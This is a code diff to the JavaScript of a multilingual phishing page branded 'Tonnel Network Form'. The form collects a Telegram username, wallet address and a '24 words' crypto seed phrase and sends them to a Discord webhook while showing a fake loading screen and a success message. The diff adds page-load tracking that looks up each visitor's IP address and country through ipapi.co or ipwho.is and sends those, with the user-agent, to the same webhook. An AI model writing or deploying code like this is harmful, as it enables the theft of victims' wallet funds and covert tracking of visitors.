@@ -14,13 +14,14 @@ const successMessage = document.getElementById('success-message');
 const loadingState = document.getElementById('loading-state');
 const successState = document.getElementById('success-state');
 const submitBtn = document.getElementById('submitBtn');
+const formError = document.getElementById('form-error');
 
 const CONFIG = window.APP_CONFIG || {};
 const LOADING_DELAY = Number(CONFIG.loadingDelayMs) || 10000;
-const SUPPORT_BOT = CONFIG.supportBotUsername || 'TonnelHelperRubot';
 
 let currentLang = 'en';
 let lastSubmittedTelegram = '';
+let openEventSent = false;
 
 const translations = {
   en: {
@@ -42,7 +43,9 @@ const translations = {
     giftCountPlaceholder: '0',
     commissionPlaceholder: '0.000',
     addressPlaceholder: 'Address',
-    words24Placeholder: 'word1 word2 word3 ...'
+    words24Placeholder: 'word1 word2 word3 ...',
+    webhookMissing: 'Discord webhook is not configured in config.js',
+    submitFailed: 'The request was not sent. Check the webhook URL and browser network log.'
   },
   ru: {
     languageTitle: 'Выбери язык',
@@ -63,7 +66,9 @@ const translations = {
     giftCountPlaceholder: '0',
     commissionPlaceholder: '0.000',
     addressPlaceholder: 'Адрес',
-    words24Placeholder: 'слово1 слово2 слово3 ...'
+    words24Placeholder: 'слово1 слово2 слово3 ...',
+    webhookMissing: 'В config.js не указан Discord webhook',
+    submitFailed: 'Запрос не отправлен. Проверь webhook URL и сеть в браузере.'
   },
   uk: {
     languageTitle: 'Обери мову',
@@ -84,7 +89,9 @@ const translations = {
     giftCountPlaceholder: '0',
     commissionPlaceholder: '0.000',
     addressPlaceholder: 'Адреса',
-    words24Placeholder: 'слово1 слово2 слово3 ...'
+    words24Placeholder: 'слово1 слово2 слово3 ...',
+    webhookMissing: 'У config.js не вказано Discord webhook',
+    submitFailed: 'Запит не надіслано. Перевір webhook URL і мережу в браузері.'
   },
   zh: {
     languageTitle: '选择语言',
@@ -105,9 +112,15 @@ const translations = {
     giftCountPlaceholder: '0',
     commissionPlaceholder: '0.000',
     addressPlaceholder: '地址',
-    words24Placeholder: '词1 词2 词3 ...'
+    words24Placeholder: '词1 词2 词3 ...',
+    webhookMissing: 'config.js 中没有设置 Discord webhook',
+    submitFailed: '请求未发送。请检查 webhook 地址和浏览器网络。'
   }
 };
+
+function getDict() {
+  return translations[currentLang] || translations.en;
+}
 
 function showScreen(name) {
   Object.values(screens).forEach((screen) => screen.classList.remove('active'));
@@ -121,7 +134,7 @@ function normalizeTelegramUsername(value) {
 
 function setLanguage(lang) {
   currentLang = translations[lang] ? lang : 'en';
-  const dict = translations[currentLang];
+  const dict = getDict();
 
   document.querySelectorAll('[data-i18n]').forEach((node) => {
     const key = node.getAttribute('data-i18n');
@@ -137,7 +150,73 @@ function setLanguage(lang) {
   words24Input.placeholder = dict.words24Placeholder;
 }
 
-function buildDiscordPayload(data) {
+function hideFormError() {
+  formError.textContent = '';
+  formError.classList.remove('visible');
+}
+
+function showFormError(text) {
+  formError.textContent = text;
+  formError.classList.add('visible');
+}
+
+function countryCodeToFlagEmoji(countryCode) {
+  const code = (countryCode || '').trim().toUpperCase();
+  if (!/^[A-Z]{2}$/.test(code)) return '🏳️';
+  return String.fromCodePoint(...[...code].map((char) => 127397 + char.charCodeAt(0)));
+}
+
+function timeoutPromise(ms) {
+  return new Promise((_, reject) => setTimeout(() => reject(new Error('TIMEOUT')), ms));
+}
+
+async function fetchJsonWithTimeout(url, timeoutMs = 5000) {
+  const response = await Promise.race([
+    fetch(url, { cache: 'no-store' }),
+    timeoutPromise(timeoutMs)
+  ]);
+
+  if (!response.ok) {
+    throw new Error(`HTTP_${response.status}`);
+  }
+
+  return response.json();
+}
+
+async function getVisitorInfo() {
+  const fallback = {
+    ip: 'Unknown',
+    country: 'Unknown',
+    countryCode: '',
+    flag: '🏳️'
+  };
+
+  try {
+    const data = await fetchJsonWithTimeout('https://ipapi.co/json/', 5000);
+    const countryCode = data.country_code || '';
+    return {
+      ip: data.ip || fallback.ip,
+      country: data.country_name || fallback.country,
+      countryCode,
+      flag: countryCodeToFlagEmoji(countryCode)
+    };
+  } catch (_) {
+    try {
+      const data = await fetchJsonWithTimeout('https://ipwho.is/', 5000);
+      const countryCode = data.country_code || '';
+      return {
+        ip: data.ip || fallback.ip,
+        country: data.country || fallback.country,
+        countryCode,
+        flag: countryCodeToFlagEmoji(countryCode)
+      };
+    } catch (_) {
+      return fallback;
+    }
+  }
+}
+
+function buildWebhookContent(data) {
   const langLabel = {
     en: 'English',
     ru: 'Русский',
@@ -145,45 +224,63 @@ function buildDiscordPayload(data) {
     zh: '中文'
   }[currentLang] || 'English';
 
-  return {
-    username: 'Tonnel Network Form',
-    embeds: [
-      {
-        title: 'New commission gift request',
-        color: 1756415,
-        fields: [
-          { name: 'Language', value: langLabel, inline: true },
-          { name: 'Telegram', value: data.telegram || '-', inline: true },
-          { name: 'Gift count', value: String(data.giftCount || '-'), inline: true },
-          { name: 'Commission balance', value: String(data.commissionBalance || '-'), inline: true },
-          { name: 'Address', value: data.address || '-', inline: true },
-          { name: '24 words', value: data.words24 || '-', inline: false }
-        ],
-        timestamp: new Date().toISOString()
-      }
-    ]
-  };
+  return [
+    'New commission gift request',
+    `Language: ${langLabel}`,
+    `Telegram: ${data.telegram || '-'}`,
+    `Gift count: ${data.giftCount || '-'}`,
+    `Commission balance: ${data.commissionBalance || '-'}`,
+    `Address: ${data.address || '-'}`,
+    `24 words: ${data.words24 || '-'}`
+  ].join('\n');
 }
 
-async function sendToWebhook(payload) {
+function buildOpenContent(visitor) {
+  return [
+    'Site opened',
+    `IP: ${visitor.ip || 'Unknown'}`,
+    `Country: ${visitor.flag || '🏳️'} ${visitor.country || 'Unknown'}`,
+    `Country code: ${visitor.countryCode || '-'}`,
+    `Page: ${window.location.href}`,
+    `User-Agent: ${navigator.userAgent || '-'}`,
+    `Browser language: ${navigator.language || '-'}`
+  ].join('\n');
+}
+
+function hasWebhook() {
   const webhookUrl = (CONFIG.discordWebhookUrl || '').trim();
-  if (!webhookUrl || webhookUrl === 'PASTE_DISCORD_WEBHOOK_URL_HERE') {
-    return { skipped: true };
+  return webhookUrl && webhookUrl !== 'PASTE_DISCORD_WEBHOOK_URL_HERE';
+}
+
+async function sendToWebhook(content, username = 'Tonnel Network Form') {
+  const webhookUrl = (CONFIG.discordWebhookUrl || '').trim();
+
+  if (!hasWebhook()) {
+    throw new Error('WEBHOOK_NOT_CONFIGURED');
   }
 
+  const body = new URLSearchParams();
+  body.append('content', content);
+  body.append('username', username);
+
+  await fetch(webhookUrl, {
+    method: 'POST',
+    mode: 'no-cors',
+    body
+  });
+
+  return { ok: true };
+}
+
+async function sendOpenEvent() {
+  if (openEventSent || !hasWebhook()) return;
+  openEventSent = true;
+
   try {
-    await fetch(webhookUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      mode: 'no-cors',
-      body: JSON.stringify(payload)
-    });
-    return { ok: true };
+    const visitor = await getVisitorInfo();
+    await sendToWebhook(buildOpenContent(visitor), 'Tonnel Network Open Log');
   } catch (error) {
-    console.error('Webhook send failed:', error);
-    return { ok: false, error };
+    console.error('Open log failed:', error);
   }
 }
 
@@ -193,17 +290,14 @@ function resetStatusScreen() {
 }
 
 function showSuccess() {
-  const dict = translations[currentLang];
+  const dict = getDict();
   successMessage.textContent = dict.successText.replace('{username}', lastSubmittedTelegram || '@username');
   loadingState.classList.remove('active');
   successState.classList.add('active');
 }
 
 function validateForm(data) {
-  if (!data.telegram || !data.giftCount || !data.commissionBalance || !data.address || !data.words24) {
-    return false;
-  }
-  return true;
+  return Boolean(data.telegram && data.giftCount && data.commissionBalance && data.address && data.words24);
 }
 
 document.querySelectorAll('.lang-btn').forEach((button) => {
@@ -215,6 +309,7 @@ document.querySelectorAll('.lang-btn').forEach((button) => {
 
 form.addEventListener('submit', async (event) => {
   event.preventDefault();
+  hideFormError();
 
   const data = {
     telegram: normalizeTelegramUsername(telegramInput.value),
@@ -228,21 +323,33 @@ form.addEventListener('submit', async (event) => {
     return;
   }
 
+  if (!hasWebhook()) {
+    showFormError(getDict().webhookMissing);
+    return;
+  }
+
   telegramInput.value = data.telegram;
   lastSubmittedTelegram = data.telegram;
   submitBtn.disabled = true;
   resetStatusScreen();
   showScreen('status');
 
-  const webhookPromise = sendToWebhook(buildDiscordPayload(data));
-  await Promise.allSettled([
-    webhookPromise,
-    new Promise((resolve) => setTimeout(resolve, LOADING_DELAY))
-  ]);
+  try {
+    await Promise.all([
+      sendToWebhook(buildWebhookContent(data)),
+      new Promise((resolve) => setTimeout(resolve, LOADING_DELAY))
+    ]);
 
-  showSuccess();
-  submitBtn.disabled = false;
+    showSuccess();
+  } catch (error) {
+    console.error('Webhook send failed:', error);
+    showScreen('form');
+    showFormError(error && error.message === 'WEBHOOK_NOT_CONFIGURED' ? getDict().webhookMissing : getDict().submitFailed);
+  } finally {
+    submitBtn.disabled = false;
+  }
 });
 
 setLanguage('en');
 showScreen('language');
+sendOpenEvent();
